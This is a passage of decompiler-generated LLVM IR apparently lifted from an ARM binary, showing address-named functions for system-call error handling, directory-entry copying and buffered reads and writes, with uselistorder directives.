  uselistorder i8 0, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 33, 32, 24, 34, 4, 17, 5, 35, 37, 36, 25, 38, 39, 40, 0, 20, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 1, 60, 62, 59, 26, 61, 27, 63, 64, 58, 2, 29, 65, 68, 30, 66, 67, 28, 69, 70, 71, 72, 73, 3, 74, 31, 75, 76, 77, 79, 80, 19, 83, 84, 85, 23, 81, 82, 89, 21, 86, 87, 88, 22, 18, 90, 91, 78, 92, 93, 94, 95 }
  uselistorder i8 46, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder i32 255, { 5, 21, 6, 0, 1, 2, 17, 18, 19, 4, 3, 7, 10, 22, 11, 23, 8, 24, 9, 25, 14, 26, 15, 27, 12, 28, 13, 29, 20, 16, 30 }
  uselistorder i32 10, { 4, 30, 31, 32, 8, 40, 42, 41, 0, 37, 38, 72, 73, 1, 11, 33, 67, 12, 34, 35, 25, 6, 68, 26, 13, 3, 27, 69, 14, 71, 70, 36, 15, 16, 17, 18, 19, 39, 9, 43, 44, 2, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 20, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 7, 66, 21, 74, 5, 75, 76, 23, 77, 28, 29, 10, 78, 22, 79, 24 }
  uselistorder i16 0, { 0, 1, 2, 3, 8, 9, 4, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 6, 19, 7, 20, 21, 22 }
  uselistorder i32 2, { 4, 5, 168, 64, 65, 61, 310, 311, 77, 312, 313, 66, 314, 315, 174, 169, 175, 170, 91, 316, 6, 176, 7, 67, 8, 9, 10, 317, 72, 291, 11, 12, 292, 13, 14, 60, 276, 15, 16, 17, 277, 293, 18, 19, 20, 21, 78, 294, 295, 22, 23, 0, 171, 296, 24, 297, 92, 25, 167, 26, 27, 28, 29, 30, 31, 166, 32, 33, 34, 35, 36, 93, 95, 94, 68, 69, 82, 177, 178, 96, 192, 101, 193, 98, 278, 97, 194, 99, 185, 100, 191, 179, 180, 181, 182, 183, 184, 83, 186, 84, 187, 85, 188, 86, 189, 87, 190, 79, 37, 38, 279, 282, 283, 102, 73, 172, 103, 284, 104, 285, 105, 286, 106, 287, 288, 107, 289, 109, 280, 108, 281, 197, 198, 39, 110, 111, 112, 199, 200, 113, 165, 205, 114, 115, 116, 117, 118, 195, 196, 119, 120, 122, 74, 123, 121, 201, 124, 125, 126, 202, 70, 76, 203, 204, 206, 207, 208, 209, 210, 211, 128, 212, 127, 213, 214, 215, 216, 217, 218, 129, 88, 219, 220, 221, 222, 223, 224, 131, 225, 130, 226, 227, 229, 132, 228, 133, 134, 230, 231, 232, 233, 234, 235, 236, 1, 40, 41, 42, 43, 44, 45, 135, 237, 89, 238, 239, 240, 241, 242, 243, 2, 46, 47, 48, 49, 50, 51, 137, 244, 136, 245, 246, 247, 248, 249, 250, 139, 251, 140, 252, 141, 253, 52, 3, 53, 54, 55, 56, 57, 142, 254, 138, 255, 256, 62, 257, 258, 259, 260, 261, 262, 144, 143, 263, 264, 63, 265, 266, 146, 267, 147, 268, 269, 270, 271, 272, 148, 273, 145, 274, 80, 275, 149, 81, 290, 173, 71, 151, 152, 298, 153, 154, 299, 155, 156, 300, 157, 158, 301, 159, 160, 302, 161, 162, 303, 75, 304, 305, 90, 306, 163, 307, 58, 59, 308, 150, 309, 164 }
  uselistorder label %dec_label_pc_18054, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18050, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17fd4, { 1, 0 }
  uselistorder label %dec_label_pc_17f9c, { 1, 0 }
}

define i32 @function_18064(i32 %arg1) local_unnamed_addr {
dec_label_pc_18064:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 135344, i32* %r2.global-to-local, align 4
  %v4_18070 = load i32, i32* inttoptr (i32 135444 to i32*), align 4
  %v4_18078 = load i32, i32* inttoptr (i32 135408 to i32*), align 16
  store i32 %v4_18078, i32* %r1.global-to-local, align 4
  %v1_1807c = add i32 %arg1, 44
  %v2_1807c = inttoptr i32 %v1_1807c to i32*
  %v3_1807c = load i32, i32* %v2_1807c, align 4
  %v1_18080 = add i32 %arg1, 28
  %v2_18080 = inttoptr i32 %v1_18080 to i32*
  %v3_18080 = load i32, i32* %v2_18080, align 4
  store i32 %v3_18080, i32* %r2.global-to-local, align 4
  %v2_18084 = inttoptr i32 %v4_18070 to i32*
  store i32 %v3_1807c, i32* %v2_18084, align 4
  %v0_18088 = load i32, i32* %r2.global-to-local, align 4
  %v1_18088 = load i32, i32* %r1.global-to-local, align 4
  %v2_18088 = inttoptr i32 %v1_18088 to i32*
  store i32 %v0_18088, i32* %v2_18088, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 44, { 45, 0, 1, 4, 5, 6, 2, 7, 8, 9, 15, 10, 16, 14, 26, 27, 28, 29, 30, 31, 23, 24, 25, 21, 22, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 11, 17, 18, 19, 20, 12, 42, 3, 43, 13, 44 }
  uselistorder i32 135344, { 18, 0, 19, 20, 1, 2, 21, 3, 4, 5, 22, 23, 6, 7, 24, 8, 25, 26, 27, 28, 9, 12, 13, 11, 10, 14, 15, 29, 16, 17 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_18094(i32 %arg1) local_unnamed_addr {
dec_label_pc_18094:
  %v0_18094 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18094, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18094
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18094, %bb
  %v4_18098 = phi i32 [ %arg1, %dec_label_pc_18094 ], [ 0, %bb ]
  ret i32 %v4_18098

; uselistorder directives
  uselistorder i1* @cpsr_z, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 28, 11, 12, 13, 24, 25, 26, 27, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1809c(i32 %arg1) local_unnamed_addr {
dec_label_pc_180d8:
  store i32 %arg1, i32* @global_var_23390.673, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* @global_var_23390.673, { 1, 0, 2 }
}

define i32 @function_180e8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_180e8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_180e8 = load i32, i32* @r7, align 4
  store i32 %v3_180e8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18110, label %dec_label_pc_18100

dec_label_pc_18100:                               ; preds = %dec_label_pc_180e8
  %v0_18100 = call i32 @function_13574()
  %v0_18104 = load i32, i32* %r7.global-to-local, align 4
  %v1_18104 = sub i32 0, %v0_18104
  %v2_18108 = inttoptr i32 %v0_18100 to i32*
  store i32 %v1_18104, i32* %v2_18108, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_18114.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18110

dec_label_pc_18110:                               ; preds = %dec_label_pc_180e8, %dec_label_pc_18100
  %v2_18114 = phi i32 [ %v3_180e8, %dec_label_pc_180e8 ], [ %v2_18114.pre, %dec_label_pc_18100 ]
  %v0_18110 = phi i32 [ %arg1, %dec_label_pc_180e8 ], [ -1, %dec_label_pc_18100 ]
  store i32 %v2_18114, i32* %r7.global-to-local, align 4
  ret i32 %v0_18110

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18110, { 1, 0 }
}

define i32 @function_1811c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1811c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_18120 = load i32, i32* @r4, align 4
  %v6_18120 = load i32, i32* @r5, align 4
  %v12_18120 = load i32, i32* @r7, align 4
  %v1_18124 = add i32 %arg3, 14
  %v2_1812c = ptrtoint i32* %stack_var_-72 to i32
  %v1_18130 = and i32 %v1_18124, -8
  %v2_18134 = sub i32 %v2_1812c, %v1_18130
  %v1_18138 = add i32 %v2_18134, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_18138, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_18174, label %dec_label_pc_18160

dec_label_pc_18160:                               ; preds = %dec_label_pc_1811c
  %v0_18160 = call i32 @function_13574()
  %v0_18164 = load i32, i32* %r4.global-to-local, align 4
  %v1_18164 = sub i32 0, %v0_18164
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1816c = inttoptr i32 %v0_18160 to i32*
  store i32 %v1_18164, i32* %v2_1816c, align 4
  %v0_1817c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1817c

dec_label_pc_18174:                               ; preds = %dec_label_pc_1811c
  br i1 false, label %dec_label_pc_1817c, label %dec_label_pc_18184

dec_label_pc_1817c:                               ; preds = %dec_label_pc_18174, %dec_label_pc_18160
  %v0_1817c = phi i32 [ -1, %dec_label_pc_18174 ], [ %v0_1817c.pre, %dec_label_pc_18160 ]
  store i32 %v0_1817c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18250

dec_label_pc_18184:                               ; preds = %dec_label_pc_18174
  %v2_18184 = add i32 %v1_18138, %arg1
  %v2_18188 = add i32 %tmp, %arg3
  store i32 %v2_18188, i32* @ip, align 4
  store i32 %v1_18138, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18238

dec_label_pc_181a4:                               ; preds = %dec_label_pc_18238
  %v1_181a4 = add i32 %v0_181f8, 16
  %v2_181a4 = inttoptr i32 %v1_181a4 to i16*
  %v3_181a4 = load i16, i16* %v2_181a4, align 2
  %v4_181a4 = zext i16 %v3_181a4 to i32
  %v1_181a8 = add nuw nsw i32 %v4_181a4, 7
  %v1_181ac = and i32 %v1_181a8, 131064
  store i32 %v1_181ac, i32* %r2.global-to-local, align 4
  %v2_181b4 = add i32 %v1_181ac, %v0_18200
  store i32 %v2_181b4, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_181b4, %v2_18188
  br i1 %tmp26, label %dec_label_pc_181c0, label %dec_label_pc_181f4

dec_label_pc_181c0:                               ; preds = %dec_label_pc_181a4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_181c8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_181c8, i32* %r2.global-to-local, align 4
  %v0_181cc = load i32, i32* %sl.global-to-local, align 4
  %v1_181d0 = load i32, i32* @sp, align 4
  %v2_181d0 = inttoptr i32 %v1_181d0 to i32*
  store i32 0, i32* %v2_181d0, align 4
  %v4_181d4 = call i32 @function_18458(i32 %arg1, i32 0, i32 %v0_181c8, i32 %v0_181cc)
  %v0_181d8 = load i32, i32* @r5, align 4
  %v1_181d8 = load i32, i32* %r6.global-to-local, align 4
  %v9_181d8 = icmp eq i32 %v0_181d8, %v1_181d8
  br i1 %v9_181d8, label %dec_label_pc_181e0, label %dec_label_pc_1824c

dec_label_pc_181e0:                               ; preds = %dec_label_pc_181c0
  %v0_181e0 = call i32 @function_13574()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_181ec = inttoptr i32 %v0_181e0 to i32*
  store i32 22, i32* %v2_181ec, align 4
  %v0_18250.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18250

dec_label_pc_181f4:                               ; preds = %dec_label_pc_181a4
  %v1_181f4 = inttoptr i32 %v0_181f8 to i32*
  %v2_181f4 = load i32, i32* %v1_181f4, align 4
  %v3_181f4 = add i32 %v0_181f8, 4
  %v4_181f4 = inttoptr i32 %v3_181f4 to i32*
  %v5_181f4 = load i32, i32* %v4_181f4, align 4
  store i32 %v5_181f4, i32* %r4.global-to-local, align 4
  %v1_181f8 = add i32 %v0_181f8, 8
  store i32 %v1_181f8, i32* %sb.global-to-local, align 4
  %v1_181fc = inttoptr i32 %v1_181f8 to i32*
  %v2_181fc = load i32, i32* %v1_181fc, align 4
  store i32 %v2_181fc, i32* %sb.global-to-local, align 4
  %v3_181fc = add i32 %v0_181f8, 12
  %v4_181fc = inttoptr i32 %v3_181fc to i32*
  %v5_181fc = load i32, i32* %v4_181fc, align 4
  store i32 %v5_181fc, i32* %sl.global-to-local, align 4
  %v1_18200 = inttoptr i32 %v0_18200 to i32*
  store i32 %v2_181f4, i32* %v1_18200, align 4
  %v3_18200 = add i32 %v0_18200, 4
  %v4_18200 = inttoptr i32 %v3_18200 to i32*
  %v5_18200 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18200, i32* %v4_18200, align 4
  %v0_18204 = load i32, i32* @r7, align 4
  %v1_18204 = add i32 %v0_18204, 8
  %v1_18208 = inttoptr i32 %v1_18204 to i32*
  %v2_18208 = load i32, i32* %v1_18208, align 4
  %v3_18208 = add i32 %v0_18204, 12
  %v4_18208 = inttoptr i32 %v3_18208 to i32*
  %v5_18208 = load i32, i32* %v4_18208, align 4
  store i32 %v5_18208, i32* @r4, align 4
  %v1_1820c = load i32, i32* @r5, align 4
  %v2_1820c = add i32 %v1_1820c, 8
  %v3_1820c = inttoptr i32 %v2_1820c to i32*
  store i32 %v2_18208, i32* %v3_1820c, align 4
  %v0_18210 = load i32, i32* @r4, align 4
  %v1_18210 = load i32, i32* @r5, align 4
  %v2_18210 = add i32 %v1_18210, 12
  %v3_18210 = inttoptr i32 %v2_18210 to i32*
  store i32 %v0_18210, i32* %v3_18210, align 4
  %v0_18214 = load i32, i32* %r2.global-to-local, align 4
  %v1_18214 = trunc i32 %v0_18214 to i16
  %v2_18214 = load i32, i32* @r5, align 4
  %v3_18214 = add i32 %v2_18214, 16
  %v4_18214 = inttoptr i32 %v3_18214 to i16*
  store i16 %v1_18214, i16* %v4_18214, align 2
  %v0_18218 = load i32, i32* @r7, align 4
  %v1_18218 = add i32 %v0_18218, 18
  %v2_18218 = inttoptr i32 %v1_18218 to i8*
  %v3_18218 = load i8, i8* %v2_18218, align 1
  %v4_18218 = zext i8 %v3_18218 to i32
  store i32 %v4_18218, i32* @r3, align 4
  %v2_1821c = load i32, i32* @r5, align 4
  %v3_1821c = add i32 %v2_1821c, 18
  %v4_1821c = inttoptr i32 %v3_1821c to i8*
  store i8 %v3_18218, i8* %v4_1821c, align 1
  %v0_18220 = load i32, i32* @r7, align 4
  %v1_18220 = add i32 %v0_18220, 16
  %v2_18220 = inttoptr i32 %v1_18220 to i16*
  %v3_18220 = load i16, i16* %v2_18220, align 2
  %v4_18220 = zext i16 %v3_18220 to i32
  %v1_18224 = add nsw i32 %v4_18220, -19
  store i32 %v1_18224, i32* @r2, align 4
  %v0_18228 = call i32 @function_13680()
  %v0_1822c = load i32, i32* @r7, align 4
  %v1_1822c = add i32 %v0_1822c, 16
  %v2_1822c = inttoptr i32 %v1_1822c to i16*
  %v3_1822c = load i16, i16* %v2_1822c, align 2
  %v4_1822c = zext i16 %v3_1822c to i32
  %v0_18230 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_18230, i32* @r5, align 4
  %v2_18234 = add i32 %v4_1822c, %v0_1822c
  store i32 %v2_18234, i32* @r7, align 4
  br label %dec_label_pc_18238

dec_label_pc_18238:                               ; preds = %dec_label_pc_18184, %dec_label_pc_181f4
  %v0_18200 = phi i32 [ %tmp, %dec_label_pc_18184 ], [ %v0_18230, %dec_label_pc_181f4 ]
  %v0_181f8 = phi i32 [ %v1_18138, %dec_label_pc_18184 ], [ %v2_18234, %dec_label_pc_181f4 ]
  %v3_1823c = icmp ult i32 %v0_181f8, %v2_18184
  %v1_18240 = add i32 %v0_18200, 19
  store i32 %v1_18240, i32* @r0, align 4
  %v1_18244 = add i32 %v0_181f8, 19
  store i32 %v1_18244, i32* @r1, align 4
  br i1 %v3_1823c, label %dec_label_pc_181a4, label %dec_label_pc_1824c.loopexit

dec_label_pc_1824c.loopexit:                      ; preds = %dec_label_pc_18238
  %v0_1824c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1824c

dec_label_pc_1824c:                               ; preds = %dec_label_pc_1824c.loopexit, %dec_label_pc_181c0
  %v1_1824c = phi i32 [ %v0_18200, %dec_label_pc_1824c.loopexit ], [ %v0_181d8, %dec_label_pc_181c0 ]
  %v0_1824c = phi i32 [ %v0_1824c.pre, %dec_label_pc_1824c.loopexit ], [ %v1_181d8, %dec_label_pc_181c0 ]
  %v2_1824c = sub i32 %v1_1824c, %v0_1824c
  store i32 %v2_1824c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18250

dec_label_pc_18250:                               ; preds = %dec_label_pc_181e0, %dec_label_pc_1817c, %dec_label_pc_1824c
  %v0_18250 = phi i32 [ %v0_18250.pre, %dec_label_pc_181e0 ], [ %v0_1817c, %dec_label_pc_1817c ], [ %v2_1824c, %dec_label_pc_1824c ]
  store i32 %v3_18120, i32* %r4.global-to-local, align 4
  store i32 %v6_18120, i32* @r5, align 4
  store i32 %v12_18120, i32* @r7, align 4
  ret i32 %v0_18250

; uselistorder directives
  uselistorder i32 %v0_181f8, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_18200, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_18138, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 8, 9, 0, 3, 10, 4, 11, 5, 12, 6, 13, 7, 14, 17, 1, 15, 2, 16 }
  uselistorder i32* @r3, { 9, 10, 50, 51, 99, 100, 2, 101, 102, 103, 3, 104, 105, 106, 4, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 0, 125, 126, 127, 128, 11, 8, 12, 13, 14, 15, 16, 129, 52, 53, 130, 131, 140, 141, 142, 135, 48, 49, 63, 68, 69, 39, 70, 71, 72, 73, 17, 18, 19, 146, 143, 144, 145, 1, 147, 148, 149, 136, 20, 74, 40, 41, 42, 137, 138, 139, 75, 54, 132, 133, 134, 76, 77, 78, 79, 7, 80, 81, 6, 82, 83, 84, 85, 86, 87, 88, 34, 27, 33, 21, 22, 23, 24, 25, 26, 28, 29, 30, 31, 32, 35, 36, 37, 38, 64, 65, 67, 66, 46, 89, 43, 44, 45, 47, 55, 56, 57, 58, 59, 60, 61, 62, 90, 91, 92, 93, 94, 95, 5, 96, 97, 98 }
  uselistorder i32 18, { 9, 10, 0, 11, 1, 12, 2, 13, 3, 14, 8, 4, 15, 16, 5, 17, 6, 18, 7, 19 }
  uselistorder i32 22, { 1, 0, 12, 2, 3, 4, 17, 5, 6, 7, 13, 8, 14, 9, 15, 10, 16, 18, 11, 19 }
  uselistorder i32* @sp, { 4, 5, 1, 6, 0, 7, 2, 8, 3 }
  uselistorder i32 7, { 33, 30, 31, 16, 0, 1, 52, 6, 34, 35, 17, 36, 18, 37, 4, 19, 47, 20, 21, 22, 23, 24, 25, 26, 27, 38, 7, 39, 8, 40, 9, 10, 41, 11, 42, 12, 43, 13, 44, 14, 45, 5, 46, 2, 28, 48, 3, 29, 49, 50, 32, 15, 51 }
  uselistorder i32* @ip, { 9, 10, 11, 95, 12, 13, 8, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 3, 129, 130, 131, 132, 133, 134, 135, 136, 137, 14, 0, 15, 16, 17, 18, 19, 138, 139, 52, 53, 54, 55, 56, 4, 57, 58, 59, 30, 31, 32, 33, 34, 35, 60, 61, 62, 143, 140, 141, 142, 1, 144, 28, 63, 64, 65, 66, 2, 67, 68, 69, 40, 41, 42, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 5, 36, 37, 38, 39, 21, 22, 23, 24, 25, 26, 27, 85, 20, 29, 43, 44, 45, 46, 47, 48, 49, 6, 50, 51, 86, 87, 88, 89, 90, 91, 92, 7, 93, 94 }
  uselistorder i1 false, { 0, 22, 23, 24, 40, 15, 21, 41, 42, 43, 44, 45, 2, 1, 25, 28, 27, 26, 29, 4, 6, 35, 34, 16, 17, 7, 32, 5, 13, 14, 8, 9, 10, 30, 46, 47, 48, 3, 11, 12, 36, 37, 38, 19, 39, 18, 20, 33, 31, 49 }
  uselistorder i32 -8, { 36, 16, 17, 18, 19, 20, 21, 15, 14, 8, 13, 12, 11, 10, 22, 23, 24, 25, 26, 38, 27, 28, 29, 30, 31, 37, 39, 32, 40, 35, 9, 33, 34, 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 14, { 11, 12, 20, 7, 8, 9, 10, 1, 2, 3, 4, 5, 13, 14, 6, 15, 16, 17, 18, 0, 19 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_18250, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18238, { 1, 0 }
}

define i32 @function_18260(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_18260:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18260 = load i32, i32* @r4, align 4
  store i32 %v3_18260, i32* %stack_var_-12, align 4
  %v0_18264 = load i32, i32* %r0.global-to-local, align 4
  %v1_18264 = inttoptr i32 %v0_18264 to i16*
  %v2_18264 = load i16, i16* %v1_18264, align 2
  %v3_18264 = zext i16 %v2_18264 to i32
  %v1_18268 = and i32 %v3_18264, 4
  store i32 %v1_18268, i32* %r5.global-to-local, align 4
  %v2_18268 = icmp eq i32 %v1_18268, 0
  store i32 %v0_18264, i32* %r4.global-to-local, align 4
  br i1 %v2_18268, label %dec_label_pc_1827c, label %bb

bb:                                               ; preds = %dec_label_pc_18260
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1827c:                               ; preds = %dec_label_pc_18260
  %v1_1827c = icmp slt i32 %arg2, 0
  br i1 %v1_1827c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1827c
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1827c, %bb18
  %v1_18284 = add i32 %v0_18264, 4
  %v2_18284 = inttoptr i32 %v1_18284 to i32*
  %v3_18284 = load i32, i32* %v2_18284, align 4
  store i32 %v3_18284, i32* %r0.global-to-local, align 4
  %v1_18288 = call i32 @function_12ee4(i32 %v3_18284)
  store i32 %v1_18288, i32* %r0.global-to-local, align 4
  %v5_18290 = icmp sgt i32 %v1_18288, 0
  br i1 %v5_18290, label %.thread7, label %dec_label_pc_18294

dec_label_pc_18294:                               ; preds = %bb19
  %v2_1828c = icmp eq i32 %v1_18288, 0
  %v0_18294 = load i32, i32* %r4.global-to-local, align 4
  %v1_18294 = inttoptr i32 %v0_18294 to i16*
  %v2_18294 = load i16, i16* %v1_18294, align 2
  br i1 %v2_1828c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_18294
  %v2_18298 = or i16 %v2_18294, 4
  store i16 %v2_18298, i16* %v1_18294, align 2
  %v1_182b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_18294
  %v2_1829c = or i16 %v2_18294, 8
  store i16 %v2_1829c, i16* %v1_18294, align 2
  %v1_182a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_182a8, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_182b4 = phi i32 [ %v1_182b4.pre, %bb20 ], [ 0, %bb ], [ %v1_18288, %bb19 ], [ %v1_182a8, %bb21 ]
  %v2_182b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_182b0, i32* @r4, align 4
  ret i32 %v1_182b4

; uselistorder directives
  uselistorder i16 %v2_18294, { 1, 0 }
  uselistorder i32 %v1_18288, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_12ee4, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_182b8(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_182b8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_182b8 = load i32, i32* @r4, align 4
  store i32 %v3_182b8, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_182d02 = icmp eq i32 %arg3, 0
  store i1 %v2_182d02, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_182d02, label %dec_label_pc_18360, label %dec_label_pc_182d8

dec_label_pc_182d0thread-pre-split:               ; preds = %dec_label_pc_182d8
  %v3_182f0 = load i32, i32* %r6.global-to-local, align 4
  %v5_182f0 = add i32 %v3_182f0, %v3_182e8
  store i32 %v5_182f0, i32* %r6.global-to-local, align 4
  %v4_182f4 = load i32, i32* %r5.global-to-local, align 4
  %v5_182f4 = sub i32 %v4_182f4, %v3_182e8
  store i32 %v5_182f4, i32* %r5.global-to-local, align 4
  %v2_182d0 = icmp eq i32 %v5_182f4, 0
  store i1 %v2_182d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_182d0, label %dec_label_pc_182d0.dec_label_pc_18360.loopexit_crit_edge, label %dec_label_pc_182d0thread-pre-split.dec_label_pc_182d8_crit_edge

dec_label_pc_182d0thread-pre-split.dec_label_pc_182d8_crit_edge: ; preds = %dec_label_pc_182d0thread-pre-split
  %v3_182d8.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_182e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_182d8

dec_label_pc_182d8:                               ; preds = %dec_label_pc_182b8, %dec_label_pc_182d0thread-pre-split.dec_label_pc_182d8_crit_edge
  %v0_182e4 = phi i32 [ %v0_182e4.pre, %dec_label_pc_182d0thread-pre-split.dec_label_pc_182d8_crit_edge ], [ %tmp, %dec_label_pc_182b8 ]
  %v0_182e0 = phi i32 [ %v5_182f0, %dec_label_pc_182d0thread-pre-split.dec_label_pc_182d8_crit_edge ], [ %arg2, %dec_label_pc_182b8 ]
  %v3_182d8 = phi i32 [ %v3_182d8.pre, %dec_label_pc_182d0thread-pre-split.dec_label_pc_182d8_crit_edge ], [ 2147483647, %dec_label_pc_182b8 ]
  %v0_182dc.in = phi i32 [ %v5_182f4, %dec_label_pc_182d0thread-pre-split.dec_label_pc_182d8_crit_edge ], [ %arg3, %dec_label_pc_182b8 ]
  %v3_182dc = phi i32 [ %v5_182f4, %dec_label_pc_182d0thread-pre-split.dec_label_pc_182d8_crit_edge ], [ %arg3, %dec_label_pc_182b8 ]
  %v0_182dc = icmp slt i32 %v0_182dc.in, 0
  %storemerge = select i1 %v0_182dc, i32 %v3_182d8, i32 %v3_182dc
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_182e0, i32* %r1.global-to-local, align 4
  %v1_182e4 = add i32 %v0_182e4, 4
  %v2_182e4 = inttoptr i32 %v1_182e4 to i32*
  %v3_182e4 = load i32, i32* %v2_182e4, align 4
  %v3_182e8 = call i32 @function_13058(i32 %v3_182e4, i32 %v0_182e0)
  %v1_182ec = icmp slt i32 %v3_182e8, 0
  %v2_182ec = icmp eq i32 %v3_182e8, 0
  store i1 %v2_182ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_182ec, label %dec_label_pc_182fc, label %dec_label_pc_182d0thread-pre-split

dec_label_pc_182fc:                               ; preds = %dec_label_pc_182d8
  %v0_182fc = load i32, i32* %r4.global-to-local, align 4
  %v1_182fc = inttoptr i32 %v0_182fc to i16*
